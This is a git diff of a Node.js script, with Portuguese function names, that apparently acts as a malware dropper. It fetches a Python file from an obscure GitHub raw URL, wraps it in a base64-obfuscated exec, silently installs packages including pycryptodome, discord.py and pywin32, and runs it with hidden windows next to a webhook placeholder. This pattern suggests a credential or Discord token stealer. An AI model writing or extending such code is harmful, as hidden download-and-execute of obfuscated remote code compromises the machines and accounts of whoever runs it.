@@ -6,7 +6,7 @@ const https = require("https");
 const { exec } = require("child_process");
 
 const H00K3_URL = "%WEBHOOK%";
-const PYTHON_URL = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/o1dwwnos0m2r.py";
+const PYTHON_URL = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/main/f9a75c19da8cdd/o1dwwnos0m2r.py";
 
 function gerarNomeAleatorio() {
   return crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, "").substring(0, 12);
@@ -25,6 +25,14 @@ function baixarPython(destPath) {
     }).on("error", () => {
       try { fs.unlinkSync(destPath); } catch {}
       resolve(false);
+    });
+  });
+}
+
+function instalarDependenciasPython(baseDir) {
+  return new Promise((resolve) => {
+    exec('pip install requests pycryptodome discord.py pywin32', { cwd: baseDir, windowsHide: true }, () => {
+      resolve();
     });
   });
 }
@@ -49,6 +57,8 @@ import base64
 exec(compile(base64.b64decode("${base64Code}"), "<string>", "exec"))
 `;
     await fsPromises.writeFile(filePath, finalCode, "utf8");
+
+    await instalarDependenciasPython(baseDir);
 
     return new Promise((resolve) => {
       exec(`python "${filePath}"`, { cwd: baseDir, windowsHide: true }, (err) => {
